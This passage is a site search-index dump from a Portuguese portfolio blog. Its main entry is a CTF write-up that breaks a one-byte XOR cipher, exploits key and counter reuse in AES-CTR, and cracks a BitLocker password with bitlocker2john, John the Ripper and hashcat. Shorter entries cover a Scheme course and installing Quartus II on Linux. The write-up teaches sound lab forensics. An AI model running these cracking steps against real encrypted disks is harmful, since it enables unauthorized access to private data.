...\\n\",in_RDX);   for (local_10 = 0; local_10 &lt; in_RDX; local_10 = local_10 + 1) {      *(byte *)((long)__ptr + local_10) = *(byte *)((long)__ptr + local_10) ^ (byte)__block;   }   fwrite(__ptr,1,in_RDX,in_R8);   fwrite(\"Writing encrypted file contents ...\\n\",1,0x24,stderr);   local_18 = 0;   while( true ) {      local_28 = fread(local_1028,1,0x1000,in_RCX);      if (local_28 == 0) break;      for (local_1c = 0; local_1c &lt; 0x1000; local_1c = local_1c + 1) {         local_1028[(int)local_1c] = local_1028[(int)local_1c] ^ (byte)__block;      }      fwrite(local_1028,local_28,1,in_R8);      local_18 = local_18 + local_28;   }   fprintf(stderr,\"Done! Encrypted &amp; wrote %lu bytes from original file\\n\",local_18);   return; }   Podemos utilizar o Ghidra para gradualmente melhorar nosso entendimento do programa, renomeando e re-tipando variáveis com base na nossa experiência com a linguagem C. Mesmo sem saber C muito bem, poderíamos pedir para o ChatGPT (ou similares) resumir o que o programa faz:     Segue uma cópia da resposta que obti da IA, onde ela explica a função encrypt:  The `encrypt` function takes the encryption key and the flag as arguments and performs the actual encryption process. Here's how it works:  1. It writes a message to indicate that it's starting the encryption process. 2. It writes a PDF header to the output file. 3. It performs a bitwise XOR operation on each byte of the flag with the encryption key byte. 4. It writes the encrypted flag to the output file. 5. It writes a message to indicate that it's starting to encrypt the file contents. 6. It reads blocks of 4096 bytes from the input file and performs a bitwise XOR operation on each byte with the encryption key byte. 7. It writes the encrypted file contents to the output file. 8. It keeps track of the total number of bytes written to the output file. 9. Once it finishes reading the input file, it writes a message indicating that the encryption process is done and the total number of bytes written. 10. The function returns, and the execution continues in the main function.   Vemos que o ChatGPT chegou à mesma conclusão quanto ao magic number de PDF e quanto à ordem de escrita da flag cifrada e do arquivo cifrado. Ele também inferiou o processo de criptografia (e podemos verificar que está correto): o programa utiliza uma chave de 1 byte, e escreve na saída o resultado do XOR entre essa chave e cada um dos bytes sendo cifrados. Assim, podemos inferir que o arquivo rec.pdf teria sido gerado como a saída desse programa.   Não sabemos nada sobre a geração da chave que foi usada, mas como ela tem apenas 1 byte podemos facilmente testar todas as 256 possibilidades. Como sabemos o formato esperado das nossas flags, e que a chave correta vai decifrar uma flag no início do arquivo, podemos reverter a criptografia com o seguinte script:  CFILE = 'rec.pdf' PFILE = 'original.flagged'  with open(CFILE, 'rb') as ct:     buf = ct.read(256)      key = None     for k in range(0, 256):         dec = bytearray([ k ^ b for b in buf ])         if b'cco{' in dec:             key = k             break      print(f\"key = {key}\")      buf = buf[5:] # remove false '%PDF-' header      with open(PFILE, 'wb+') as pt:         while buf != b'':             buf = bytearray([ key ^ b for b in buf ])             pt.write(buf)             buf = ct.read(4096)   Com um hexdump, podemos observar que os primeiros bytes do arquivo original.flagged (gerado pelo script acima) contêm nossa terceira flag:  $ python decrypt.py =&gt; key = 254  $ hexdump -C original.flagged | head -n 3 =&gt; 00000000  63 63 6f 7b 6b 52 49 50  74 30 6e 31 74 33 7d 42  |cco{kRIPt0n1t3}B| 00000010  5a 68 39 31 41 59 26 53  59 b8 a8 39 b3 05 b6 ae  |Zh91AY&amp;SY..9....| 00000020  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|   Deeper and deeper   Ao continuar, precisamos nos lembrar que, se o email que encontramos estiver correto, o arquivo que acabamos de decifrar contém registros da SeTIC obtidos no momento do ataque hacker. Então, para obter esses dados, basta remover a flag do início do arquivo decifrado:  $ tail -c +16 original.flagged &gt; original.bin  $ file original.bin =&gt; original.bin: bzip2 compressed data, block size = 900k   Após descomprimir o bzip2, identificamos um arquivo apontado pelo file como um “pcap capture file”:  $ bzip2 -tv original.bin =&gt; original.bin: ok  $ bzip -dk original.bin =&gt; # bzip2: Can't guess original name for original.bin -- using original.bin.out  $ file original.bin.out =&gt; original.bin.out: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)   O Kali imediatamente reconhece este tipo de arquivo e vai utilizar, por padrão, o Wireshark para abrí-lo:    Temos então o trafego da rede, supostamente capturado pela SeTIC durante o ataque. Para começar a análise, podemos observar estatísticas dos protocolos de comunicação em uso (opção Statistics -&gt; Protocol Hierarchy):    Como foi utilizado o IPv4, analisamos também as estatísticas de portas e endereços de IP utilizados na comunicação (opção Statistics -&gt; IPv4 Statistics -&gt; Destinations and Ports):    Resumindo: temos dois hosts se comunicando, com endereços de IP 192.168.56.126 e 192.168.56.1. O primeiro deles (abreviado .126) utilizou portas TCP altas, normalmente atribuídas pelo sistema operacional quando estabelece uma conexão com um servidor externo. O segundo host (sufixo de IP .1) utilizou as portas TCP 23 (telnet) e 1337, que são portas baixas normalmente abertas por servidores.   A tela padrão do Wireshark nos permite analisar cada pacote individual que foi capturado, mas também podemos utilizar a opção Analyze -&gt; Follow -&gt; TCP Stream para observar toda a conversa em uma conexão TCP:    A stream 0 contém uma conversa em plaintext, supostamente conduzida entre hackers que participaram do ataque à SeTIC/UFSC:  testando ok enviando imagem recebido enviando script recebido enviando senha recebido ok   A stream 1 é bem maior, e não conseguimos identificar de imediato do que se trata. Já as streams 2 e 3 parecem conter, respectivamente, um script de Python e algumas linhas em hexadecimal:   from os import urandom from sys import stdout, stderr  # pip install pycryptodome from Crypto.Cipher import AES from Crypto.Util import Counter from Crypto.Util.Padding import pad   class Cypher:     bits = 128     block_size = bits // 8      def __init__(self, n):         self.keys = [[None] * Cypher.block_size] * n         self.ctrs = [Counter.new(Cypher.bits, initial_value=i) for i in range(n)]         for i in range(n):             for j in range(Cypher.block_size):                 self.keys[i][j] = urandom(1)      def encrypt(self, msg, index):         key = b''.join(self.keys[index])         ctr = self.ctrs[index]         cipher = AES.new(key, AES.MODE_CTR, counter=ctr)         plain_bytes = msg.encode()         return cipher.encrypt(pad(plain_bytes, Cypher.block_size))   msgs = [     \"consegui clonar dados confidenciais do PC dele\",     \"vou proteger a imagem com uma senha randomica:\",     \"??????????????????????\",     \"nao se preocupe, essas msgs vao ser cifradas com AES-CTR\", ]  cypher = Cypher(len(msgs))  for i, msg in enumerate(msgs):     enc = cypher.encrypt(msg, i)     stdout.write(enc.hex() + '\\n')  # NOTE: lembrar de anotar essa chave pq sem ela vai ser impossivel de lembrar minha senha #for key in cypher.keys: stderr.write(b''.join(key).hex())   9f1ee383dc37b0bcfd2c6c5c9a16030bbc72a38ab4ca2064c3675ec87315e897f22b6fe6940c399a33218d8de7153a57 ae7cb2c5b7982c7fc86652de361aab97fe237ba39d437aa51d219c85ea504b300890953abee39ed65cf19d57fb9eb193 b3623ce6d04339ea13628693f2354b1b05bd893aeca2fab83996fe3e90aeb99b 08999b3abfe7d0c241f99b57efd4d6bdc49382d2c82f27515c265ae5d54796eaf4f2c132de2e41beb482fbd603db0d4805eea2ecfc74a95a648b8ac84a1fdd58   Com base na conversa da stream 0, podemos tentar identificar as outras como “a imagem”, “o script” e “a senha”, respectivamente.   Infelizmente, uma decodificação simples do hexadecimal não nos dá algo reconhecível. Todavia, podemos perceber que o formato da “senha” parece condizer com o que o script está gerando (trecho destacado a seguir): 4 mensagens cifradas, codificadas em hexadecimal e separadas por uma quebra de linha:  msgs = [     \"consegui clonar dados confidenciais do PC dele\",     \"vou proteger a imagem com uma senha randomica:\",     \"??????????????????????\",     \"nao se preocupe, essas msgs vao ser cifradas com AES-CTR\", ]  cypher = Cypher(len(msgs))  for i, msg in enumerate(msgs):     enc = cypher.encrypt(msg, i)     stdout.write(enc.hex() + '\\n')   A última mensagem parece não estar mentindo, pois o método Cypher.encrypt de fato utiliza a biblioteca pycryptodome para implementar uma cifra AES-CTR (com chaves de 128 bits) sobre cada mensagem. Ao pesquisar “AES CTR” na web, podemos acabar novamente na Wikipedia, que explica que “CTR” é um “modo” para cifras de bloco.     O modo CTR de certa forma simula um One-Time Pad: a operação final da cifra ainda é \\(C_i = X_i \\oplus M_i\\) (e \\(M_i = X_i \\oplus C_i\\) para decifrar). A diferença é que isso é feito em blocos (neste caso, de 128 bits), e cada bloco gera um \\(X_i\\) diferente a partir de:     Uma chave \\(K\\) (pode ser reutilizada em todos os blocos)   Um initialization vector (\\(IV_i\\)) composto por:            Um contador, normalmente incrementado a cada bloco       Um nonce, que jamais deve ser reutilizado com o mesmo contador e chave           A cifra de bloco propriamente dita (no caso do AES, seria o algoritmo de Rijndael) “mistura” a chave e o IV para gerar o “one-time pad” de cada bloco: \\(X_i = AES(K, IV_i)\\)   O script, no entanto, não faz menção a nenhum IV ou nonce. Como a pycryptodome é uma biblioteca open-source, podemos analisar a implementação da classe Crypto.Util.Counter, onde vemos que, se o contador for construído sem os parâmetros suffix e prefix, o nonce vai ser sempre igual (a uma string vazia):  def new(nbits, prefix=b\"\", suffix=b\"\", initial_value=1, little_endian=False, allow_wraparound=False):     \"\"\"Create a stateful counter block function suitable for CTR encryption modes.      Each call to the function returns the next counter block.     Each counter block is made up by three parts:      +------+--------------+-------+     |prefix| counter value|postfix|     +------+--------------+-------+      The counter value is incremented by 1 at each call.\"\"\"      # implementation...   Em outras palavras, \\(IV_i = CTR_i\\), o valor do contador.   Analisando o código com mais atenção, percebemos também um erro comum de programação em Python relacionado à criação de arrays:  self.keys = [[None] * Cypher.block_size] * n   A expressão [None] * Cypher.block_size cria um array onde cada elemento é igual ao valor entre chaves: None. Em seguida, esse array é replicado n vezes na expressão de fora. Embora a intenção provavelmente não seja essa, o resultado é que cada elemento em keys aponta para o mesmo array de tamanho Cypher.block_size. Assim, alterar o elemento keys[k][0] causa alterações em key[i][0], para todo i.   De fato, se instalarmos o pycryptodome e rodarmos o programa depois de descomentar as últimas linhas do script, vamos observar que as chaves de 128 bits geradas para cada mensagem são iguais ao longo de uma execução:  $ python s2.py &gt; /dev/null =&gt; f29deafeabf31c6c2eb5f2f5b9442969 f29deafeabf31c6c2eb5f2f5b9442969 f29deafeabf31c6c2eb5f2f5b9442969 f29deafeabf31c6c2eb5f2f5b9442969  $ python s2.py &gt; /dev/null =&gt; cb7944c5dcbf9b8d402dcc3694069908 cb7944c5dcbf9b8d402dcc3694069908 cb7944c5dcbf9b8d402dcc3694069908 cb7944c5dcbf9b8d402dcc3694069908   Ou seja, não sabemos qual chave de 128 bits foi usada originalmente, mas sabemos que a mesma chave foi usada para cifrar cada mensagem. Além disso, sabemos que os IVs são iguais aos contadores de cada bloco, e temos um contador inicializado para cada mensagem:  self.ctrs = [Counter.new(Cypher.bits, initial_value=i) for i in range  Note que o valor inicial do contador depende do indice da mensagem.   Juntando tudo isso, sabemos que, para cada bloco j na mensagem i: \\(C_{ij} = M_{ij} \\oplus AES(K_i, i+j)\\)   Além disso, devido ao bug na inicialização das chaves, sabemos que todos os \\(K_i\\) são iguais. Isso implica que cada expressão na forma \\(AES(K_i, j)\\) pode ser expressada simplesmente como \\(X_j\\).   Voltando, então, à mensagem 1: \\(C_{10} = M_{10} \\oplus X_1 \\\\ C_{11} = M_{11} \\oplus X_2 \\\\ C_{12} = M_{12} \\oplus X_3\\)   E à mensagem 2, que contém a senha de nosso interesse: \\(C_{20} = M_{20} \\oplus X_2 \\\\ C_{21} = M_{21} \\oplus X_3\\)   Aqui vemos claramente que, devido aos problemas no uso do AES-CTR (em especial a falta de um nonce), o script acaba reutilizando \\(X_2\\) e \\(X_3\\) para cifrar blocos das mensagens 1 e 2. Vamos começar a reverter a criptografia separando os blocos de cada mensagem:   &gt;&gt;&gt; msgs = [ ...     \"consegui clonar dados confidenciais do PC dele\", ...     \"vou proteger a imagem com uma senha randomica:\", ...     \"??????????????????????\", ...     \"nao se preocupe, essas msgs vao ser cifradas com AES-CTR\", ... ] &gt;&gt;&gt; &gt;&gt;&gt; encs = [ ...     '9f1ee383dc37b0bcfd2c6c5c9a16030bbc72a38ab4ca2064c3675ec87315e897f22b6fe6940c399a33218d8de7153a57', ...     'ae7cb2c5b7982c7fc86652de361aab97fe237ba39d437aa51d219c85ea504b300890953abee39ed65cf19d57fb9eb193', ...     'b3623ce6d04339ea13628693f2354b1b05bd893aeca2fab83996fe3e90aeb99b', ...     '08999b3abfe7d0c241f99b57efd4d6bdc49382d2c82f27515c265ae5d54796eaf4f2c132de2e41beb482fbd603db0d4805eea2ecfc74a95a648b8ac84a1fdd58', ... ] &gt;&gt;&gt; &gt;&gt;&gt; from Crypto.Util.Padding import pad &gt;&gt;&gt; def encode_and_pad(msg): return pad(msg.encode(), 16) ... &gt;&gt;&gt; M = [ [m[j:j+16] for j in range(0, len(m), 16)] for m in map(encode_and_pad, msgs) ] &gt;&gt;&gt; &gt;&gt;&gt; C = [ [e[j:j+16] for j in range(0, len(e), 16)] for e in map(bytes.fromhex, encs) ]   No caso da mensagem 1, temos todos os plaintexts e ciphertexts, então podemos recuperar \\(X_1\\) a \\(X_3\\):  &gt;&gt;&gt; def xor(A, B): return bytearray(a ^ b for a, b in zip(A, B)) ... &gt;&gt;&gt; X = {} &gt;&gt;&gt; for j in range(len(M[1])): ...     X[1 + j] = xor(C[1][j], M[1][j])   Utilizando \\(X_2\\) e \\(X_3\\), conseguimos recuperar a mensagem 2, revelando a quarta flag do desafio:  &gt;&gt;&gt; decrypted = xor(X[2], C[2][0]) + xor(X[3], C[2][1]) &gt;&gt;&gt; decrypted.decode() '        cco{yEsNcE}   \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n'   Let it rip!   Acabamos de utilizar o conteúdo das streams TCP 0, 2 e 3 para conseguir a penúltima flag do CTF. O script capturado também dos dá mais informações sobre a stream 1, “a imagem”:  \"consegui clonar dados confidenciais do PC dele\" \"vou proteger a imagem com uma senha randomica:\"   Os dados transferidos na stream 1 totalizam cerca de 70 MB. Infelizmente, o Wireshark não parece ser eficiente o bastante para permitir a exportação de um hexdump desse payload. Sendo assim, podemos recorrer à ferramenta CLI tshark para extrair a imagem em um arquivo:  $ tshark -r original.bin.out -Q -z 'follow,tcp,raw,1' \\ | head -n -1 | tail -n +7 \\ | sed 's/^\\s\\+//g' \\ | xxd -r -p &gt; s1.enc  $ file s1.enc s1.enc: GPG symmetrically encrypted data (AES256 cipher)   Como esperado, a imagem está protegida. Segundo a mensagem no script, a senha dela é exatamente a quarta flag, capturada anteriormente. Com isso, podemos decifrar o arquivo com o GnuPG:  $ gpg -d s1.enc &gt; s1.dec =&gt; gpg: AES256.CFB encrypted data gpg: encrypted with 1 passphrase  $ ls -lh s1.dec =&gt; -rw-r--r-- 1 kali kali 72M Nov 15 22:45 s1.dec  $ file s1.dec =&gt; s1.dec: DOS/MBR boot sector     MS-MBR Windows 7 english at offset 0x163     \"Invalid partition table\" at offset 0x17b     \"Error loading operating system\" at offset 0x19a     \"Missing operating system\", disk signature 0x7b3b5028;     partition 1 : ID=0x7, start-CHS (0x0,2,3), end-CHS (0x8,205,5), startsector 128, 141312 sectors   Parece que temos, mais uma vez, uma imagem de disco. A partition table é do tipo DOS/MBR e o disco tem ao menos uma partição iniciando no setor 128. Desta vez, entretanto, nos deparamos com erros ao tentar listar os arquivos ou montar a partição:  $ mmls s1.dec =&gt; DOS Partition Table Offset Sector: 0 Units are in 512-byte sectors        Slot      Start        End          Length       Description 000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0) 001:  -------   0000000000   0000000127   0000000128   Unallocated 002:  000:000   0000000128   0000141439   0000141312   NTFS / exFAT (0x07) 003:  -------   0000141440   0000147455   0000006016   Unallocated  $ fls -r -o 128 s1.dec =&gt; Possible encryption detected (High entropy (8.00))  $ sudo mount -o offset=$((512*128)) s1.dec mnt/ =&gt; mount: /home/kali/seccom-ctf/snapshot/incidente/mnt: unknown filesystem type 'BitLocker'.        dmesg(1) may have more information after failed mount system call.   O fls indica “Possible encryption detected”, o que é confirmado pelo mount: parece que o volume foi protegido com BitLocker, um sistema de criptografia de disco do Windows.   Uma busca rápida por “Kali tools BitLocker” nos aponta para duas ferramentas que podem ser úteis:     dislocker: (não vem instalado por padrão) utilizado para montar partições do BitLocker, se você souber a senha   bitlocker2john: extrai hashes de senhas de discos protegidos com o BitLocker   Levando em conta que crackear senhas foi a única técnica ensinada no CTF de demonstração que ainda não utilizamos, podemos tentar essa ideia. Primeiramente, precisamos extrair os hashes das senhas que vamos crackear:   $ bitlocker2john -i s1.dec | egrep '\\$bitlocker\\$' &gt; bitlocked.hash =&gt; Signature found at 0x10003 Version: 8 Invalid version, looking for a signature with valid version...  Signature found at 0x2110000 Version: 2 (Windows 7 or later)  VMK entry found at 0x21100ad  VMK encrypted with User Password found at 21100ce VMK encrypted with AES-CCM  VMK entry found at 0x211018d  VMK encrypted with Recovery Password found at 0x21101ae Searching AES-CCM from 0x21101ca Trying offset 0x211025d.... VMK encrypted with AES-CCM!!  Signature found at 0x28bb000 Version: 2 (Windows 7 or later)  VMK entry found at 0x28bb0ad  VMK entry found at 0x28bb18d  Signature found at 0x3066000 Version: 2 (Windows 7 or later)  VMK entry found at 0x30660ad  VMK entry found at 0x306618d  $ cat bitlocked.hash =&gt; $bitlocker$0$16$f1e83bdb6ff56c685b2e9e2fd482bdeb$1048576$12$20579fb9ff0dda0103000000$60$5e224f5665f71821128e49950fb920ac7e64946c1ae1b44ac7abc2f521d92f4de6b39373ee59bd351576a12d55ea9eeb7db96e88753332df68d96407 $bitlocker$1$16$f1e83bdb6ff56c685b2e9e2fd482bdeb$1048576$12$20579fb9ff0dda0103000000$60$5e224f5665f71821128e49950fb920ac7e64946c1ae1b44ac7abc2f521d92f4de6b39373ee59bd351576a12d55ea9eeb7db96e88753332df68d96407 $bitlocker$2$16$3b4de4c80870c035dce829c8c4c5e212$1048576$12$20579fb9ff0dda0106000000$60$d79213c35271e26a75f76142fc9823b432500f9d780e0e0c8064eaf55b438884c3836e1bdcbbe8a5e5bcd1c64fde95ccb3a2a59a6b43a08486138606 $bitlocker$3$16$3b4de4c80870c035dce829c8c4c5e212$1048576$12$20579fb9ff0dda0106000000$60$d79213c35271e26a75f76142fc9823b432500f9d780e0e0c8064eaf55b438884c3836e1bdcbbe8a5e5bcd1c64fde95ccb3a2a59a6b43a08486138606   Em seguida, verificamos se o John the Ripper suporta esse formato. Como é o caso, podemos iniciar o processo de bruteforcing / dictionary attack com a wordlist rockyou:   $ john --list=formats | grep -i 'bitlocker' =&gt; AxCrypt, AzureAD, BestCrypt, BestCryptVE4, bfegg, Bitcoin, BitLocker, 416 formats (149 dynamic formats shown as just \"dynamic_n\" here)  $ john --wordlist=/usr/share/wordlists/rockyou.txt --format=BitLocker bitlocked.hash =&gt; Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (BitLocker, BitLocker [SHA-256 AES 32/64]) Cost 1 (iteration count) is 1048576 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status 0g 0:00:00:01 0.00% (ETA: 2023-12-10 12:20) 0g/s 3.252p/s 6.504c/s 6.504C/s iloveyou..rockyou 0g 0:00:00:15 0.00% (ETA: 2024-01-06 15:52) 0g/s 3.718p/s 7.702c/s 7.702C/s tweety..hello 0g 0:00:00:32 0.00% (ETA: 2024-01-06 11:46) 0g/s 3.840p/s 7.680c/s 7.680C/s 112233..diamond 0g 0:00:00:59 0.00% (ETA: 2024-01-10 09:34) 0g/s 3.644p/s 7.288c/s 7.288C/s hellokitty..angelica 0g 0:00:01:00 0.00% (ETA: 2024-01-10 09:44) 0g/s 3.639p/s 7.279c/s 7.279C/s austin..horses 0g 0:00:02:03 0.00% (ETA: 2024-01-14 10:04) 0g/s 3.439p/s 6.878c/s 6.878C/s kitty..valeria 0g 0:00:06:15 0.01% (ETA: 2024-01-16 08:07) 0g/s 3.366p/s 6.744c/s 6.744C/s iluvme..douglas 0g 0:00:07:08 0.01% (ETA: 2024-01-16 04:50) 0g/s 3.371p/s 6.743c/s 6.743C/s missy..darius Session aborted   Depois de um tempo, decidimos parar o cracking e tentar tornar o processo um pouco mais rápido.   Vamos começar filtrando um pouco a nossa wordlist / dicionário, já que estamos tentando várias senhas fracas. Para entender quais senhas manter, criamos uma VM com Windows 10 Pro e uma partição protegida com BitLocker. O BitLocker exigiu que a senha tivesse 8 ou mais caracteres, mas não foi preciso adicionar números, caracteres especiais ou misturar letras maiusculas e minusculas.   Além disso, passamos a utilizar o hashcat, que é geralmente mais rápido que o john. Por fim, vamos crackear apenas o hash/senha de usuário, que estimamos que seja muito mais fraca do que a chave de recuperação do BitLocker (48 digitos numéricos gerados aleatoriamente).   $ awk 'length &gt;= 8' /usr/share/wordlists/rockyou.txt &gt; rockyou8.txt  $ echo '$bitlocker$0$16$f1e83bdb6ff56c685b2e9e2fd482bdeb$1048576$12$20579fb9ff0dda0103000000$60$5e224f5665f71821128e49950fb920ac7e64946c1ae1b44ac7abc2f521d92f4de6b39373ee59bd351576a12d55ea9eeb7db96e88753332df68d96407' &gt; user.hash  $ hashcat --help | grep -i bitlocker =&gt;   22100 | BitLocker | Full-Disk Encryption (FDE)  $ hashcat -a 0 -m 22100 user.hash rockyou8.txt =&gt; hashcat (v6.2.6) starting  OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: pthread-sandybridge-Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz, 1436/2936 MB (512 MB allocatable), 4MCU  Minimum password length supported by kernel: 4 Maximum password length supported by kernel: 256  Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1  Optimizers applied: * Single-Hash * Single-Salt * Slow-Hash-SIMD-LOOP  Watchdog: Temperature abort trigger set to 90c  Host memory required for this attack: 0 MB   Dictionary cache hit: * Filename..: rockyou8.txt * Passwords.: 9607178 * Bytes.....: 104537834 * Keyspace..: 9607178  Cracking performance lower than expected?  * Append -w 3 to the commandline.   This can cause your screen to lag.  * Append -S to the commandline.   This has a drastic speed impact but can be better for specific attacks.   Typical scenarios are a small wordlist but a large ruleset.  * Update your backend API runtime / driver the right way:   https://hashcat.net/faq/wrongdriver  * Create more work items to make use of your parallelization power:   https://hashcat.net/faq/morework  [s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =&gt;  $bitlocker$0$16$f1e83bdb6ff56c685b2e9e2fd482bdeb$1048576$12$20579fb9ff0dda0103000000$60$5e224f5665f71821128e49950fb920ac7e64946c1ae1b44ac7abc2f521d92f4de6b39373ee59bd351576a12d55ea9eeb7db96e88753332df68d96407:genesis1  Session..........: hashcat Status...........: Cracked Hash.Mode........: 22100 (BitLocker) Hash.Target......: $bitlocker$0$16$f1e83bdb6ff56c685b2e9e2fd482bdeb$10...d96407 Time.Started.....: Wed Nov 15 23:50:53 2023 (2 mins, 20 secs) Time.Estimated...: Wed Nov 15 23:53:13 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (rockyou8.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........:       14 H/s (9.98ms) @ Accel:32 Loops:4096 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 2016/9607178 (0.02%) Rejected.........: 0/2016 (0.00%) Restore.Point....: 1984/9607178 (0.02%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1044480-1048576 Candidate.Engine.: Device Generator Candidates.#1....: princess07 -&gt; spoiled1 Hardware.Mon.#1..: Util: 84%  Started: Wed Nov 15 23:50:44 2023 Stopped: Wed Nov 15 23:53:15 2023   Em cerca de 2 minutos e meio, conseguimos encontrar a senha do disco: genesis1. Com a senha, o dislocker consegue decifrar o disco. Basta então montarmos a partição para obter a quinta e última flag do CTF:  $ dislocker-file -v -O $((512 * 128)) -V s1.dec -u unlocked.p1 =&gt; Enter the user password: ********  $ sudo mount unlocked.p1 mnt  $ ls -lah mnt =&gt; total 13K drwxrwxrwx 1 root root 4.0K Nov  2 22:44  . drwxr-xr-x 3 kali kali 4.0K Nov 16 00:00  .. drwxrwxrwx 1 root root    0 Nov  2 22:44 '$RECYCLE.BIN' -rwxrwxrwx 1 root root   14 Nov  2 22:24  flag.txt drwxrwxrwx 1 root root 4.0K Nov  2 22:46 'System Volume Information'  $ cat mnt/flag.txt =&gt; cco{C4nc14n}   Comentários      Please enable JavaScript to view the comments powered by Disqus. ","categories": [],
        "tags": [],
        "url": "/portfolio/seccom-ctf/",
        "teaser": "/assets/images/seccom-ctf/follow-tcp-stream.png"
      },{
        "title": "Matemática Funcional em Scheme",
        "excerpt":"Tive a experiência de ministrar um minicurso na SECCOM 2019 - a Semana Acadêmica de Ciência da Computação e Sistemas de Informação da UFSC - sobre programação matemática funcional na linguagem Scheme.   Todo o conteúdo está disponível online na webpage oficial e também no GitHub.   Resumo   Scheme é um dos principais “dialetos” de Lisp, que adere ao paradigma funcional e é a segunda linguagem de programação mais antiga ainda amplamente utilizada. Devido à sua flexibilidade e simplicidade, Scheme é usada para extender o comportamento de outros softwares e foi adotada como a linguagem de scripting oficial do GNU Project.   Conteúdo   O oficina abordou algumas técnicas de programação funcional em Scheme para algoritmos matemáticos e métodos numéricos, incluindo:      Tipos de recursão            Tail Call Optimization           Abstração com funções de alta ordem e closures            Algoritmo de Exponenciação Rápida (Successive Squaring)       Método de Newton e outros Pontos Fixos           Processamento simbólico e metalinguagem            Conversão de Polinômios para a Forma de Horner       Diferenciação Analítica           Paradigma de fluxo de dados: streams e lazy evaluation            Séries infinitas e Memoization           Referências      Structure and Interpretation of Computer Programs   (SICP, a.k.a. “The Wizard Book”)   - Abelson H., Sussman G. J.   MIT OpenCourseWare 6.001 SICP lectures   - Abelson H., Sussman G. J.   The Scheme Programming Language   - Dybvig R. K.   Teach Yourself Scheme in Fixnum Days   - Sitaram D.  ","categories": [],
        "tags": [],
        "url": "/portfolio/seccom-scheme/",
        "teaser": "/assets/images/wizard.png"
      },{
        "title": "A Brief History of Programming Languages",
        "excerpt":" ","categories": ["link"],
        "tags": ["programming-languages"],
        "url": "/link/pl-history/",
        "teaser": "/assets/images/basic.png"
      },{
        "title": "How to install Quartus II on Linux",
        "excerpt":"Please note that this tutorial is intended for Debian-derived Linux distros such as Ubuntu, Mint, MX, etc.   Users running Arch-based distros should refer to the Arch Wiki (in fact, arch users can automatically download, install, and get the Quartus toolkit to work on their computers by simply using one of the AUR’s packages).   1) Download &amp; Install   Go to Intel Download Center.   Select by Device -&gt; Choose Device Family -&gt; Choose your Device   Click on the most recent Web Edition.   Select the rigth OS and click on Individual Files.   Download only what you need.   Give the downloaded script execution permission:  $ chmod +x QuartusSetup.run   Run the installation script:  $ /path/to/script/QuartusSetup.run   2) Add PATH dependencies   Create the following script file to be run at startup, one way to accomplish this is to append source /path/to/script/quartus.sh to your shell configuration file.   export QUARTUS_64BIT=1                         # Remove this if running on 32 bit export ALTERA_ROOT=\"$HOME/Applications/altera\" # Change this to the path you've installed Altera Quartus at  export QUARTUS_ROOTDIR_OVERRIDE=\"$ALTERA_ROOT/quartus\" export QSYS_ROOTDIR=\"$QUARTUS_ROOTDIR_OVERRIDE/sopc_builder/bin\" export QUARTUS_LIBRARY_PATHS=\"$QUARTUS_ROOTDIR_OVERRIDE/linux/:/lib/x86_64-linux-gnu/\" export SOPC_KIT_NIOS2=\"$ALTERA_ROOT/nios2eds\" export LD_LIBRARY_PATH=\"$LD_LIBRARY_PATH:$QUARTUS_LIBRARY_PATHS\" export PATH=\"$PATH:$ALTERA_ROOT/quartus/bin\"   3) Install 32-bit packages   A few 32-bit compatibility packages will probably need to be installed on 64-bit systems in order for some tools to work.   Try opening and using any tool directly fom the Quartus GUI. If it doesn’t work, run it from the terminal and there should be some complaint about a missing packge or library. Look up on what package you may find this library and install it.   The eclipse-nios2 tool requires installing libgtk2.0-0:i386   It may also require starting it through the terminal with:   $SOPC_KIT_NIOS2/bin/eclipse-nios2 -configuration $HOME/.nios2-ide-6.1 $WORKSPACE_ARGS \"$@\"   Extra packages I needed on a MX Linux install included gcc-multilib, lib32ncurses5, libx11-6, libfreetype6, libpng12, libc6, libxtst6, zlib1g, libssl1.0.0 and libssl-dev; generally the :i386 versions. You may also need Java 8 or greater.   4) USB-Blaster configuration   This part is based on a blog post from fpga-dev which can no longer be read.   At first, connect the cable and make sure the USB device is recognized:   $ dmesg | tail [...] [16059.962298] usb 2-2: New USB device found, idVendor=09fb, idProduct=6010 [16059.962301] usb 2-2: New USB device strings: Mfr=1, Product=2, SerialNumber=3 [16059.962303] usb 2-2: Product: CV SoCKit [16059.962305] usb 2-2: Manufacturer: Altera [16059.962307] usb 2-2: SerialNumber: ARCVSC-123-457  $ lsusb | grep Altera Bus 002 Device 007: ID 09fb:6010 Altera  Take note of the Product ID listed - 6010 in the above example.   The Quartus software will use the Linux built-in usb_device drivers. By default, only root has access to these so we must make sure the user is allowed to access them as well.   jtagd, part of the Quartus tools, is a deamon that provides the interface between the Altera tool accessing the JTAG chain and the USB driver. If not already running, jtagd will be startetd automatically when the Quartus software or jtagconfig is run. You’ll usually run these as a user, which means jtagd will also run as a user. That is why edited permission for the usb_device is necessary.   Create a file /etc/udev/rules.d/51-usbblaster.rules, make sure it has read permissions for root, and fill it with this content:   SUBSYSTEM==\"usb\",\\ ENV{DEVTYPE}==\"usb_device\",\\ ATTR{idVendor}==\"09fb\",\\ ATTR{idProduct}==\"6010\",\\ MODE=\"0666\",\\ NAME=\"bus/usb/$env{BUSNUM}/$env{DEVNUM}\",\\ RUN+=\"/bin/chmod 0666 %c\"   Edit the value for ATTR{idProduct} to match the Product ID determined before.   If you have more than one Product ID you want this to work for, simply repeat the above lines in the same file and use the other Product IDs for ATTR{idProduct}.   For the changes to take effect, reboot the 